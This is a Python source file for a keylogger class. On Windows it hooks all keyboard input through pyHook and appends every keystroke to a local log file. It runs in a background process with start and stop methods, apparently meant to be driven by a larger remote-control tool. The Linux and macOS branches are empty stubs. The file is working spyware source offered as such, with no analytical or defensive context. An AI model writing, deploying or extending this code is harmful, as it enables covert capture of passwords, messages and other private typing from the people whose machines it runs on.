
import platform, os, multiprocessing, logging


class KeyLogger:

    KEY_LOGGER_FILE = './logs.log'

    def __init__(self):
        self._process = None

    def start(self):
        print("[+] Starting keylogger...")
        if self._process:
            print("[-] Key logger already started")
            return "Key logger already started"
        else:
            self._process = multiprocessing.Process(target=self._key_logger_worker)
            self._process.start()
            print("[+] Starting keylogger")
            return "Key logger started"

    def stop(self):
        print("[+] Stopping keylogger...")
        if self._process:
            self._process.terminate()
            print("[+] Keylogger stopped...")
            return "Key logger stopped"
        else:
            print("[-] Keylogger not running")
            return "Key logger not running"

    def _create_key_log_file_if_not_existent(self):
        if not os.path.isfile(self.KEY_LOGGER_FILE):
            print("[+] Logging file not existing yet - creating")
            with open(self.KEY_LOGGER_FILE, 'w+') as f:
                f.write('+++++ KEY LOGGER LOGS +++++\n')
        else:
            print("[+] Logging file does already exist - appending")

    def _key_logger_worker(self):
        if platform.system() == 'Windows':
            import pyHook, pythoncom

            self._create_key_log_file_if_not_existent()

            print("[+] Hooking into key down event")
            hooks_manager = pyHook.HookManager()
            hooks_manager.KeyDown = _key_logger_attach
            hooks_manager.HookKeyboard()
            pythoncom.PumpMessages()
        elif platform.system() == 'Linux':
            pass  # TODO
        elif platform.system() == 'Darwin':
            pass  # TODO


def _key_logger_attach(event):
    if event.Ascii==13:
        keys = '<ENTER>'
    elif event.Ascii==8:
        keys = '<BACK SPACE>'
    elif event.Ascii==9:
        keys = '<TAB>'
    else:
        keys = chr(event.Ascii)

    logging.basicConfig(filename="./logs.log", level=logging.DEBUG, format='%(message)s')
    print("Logged: {}".format(keys))
    logging.log(10, keys)

    return True
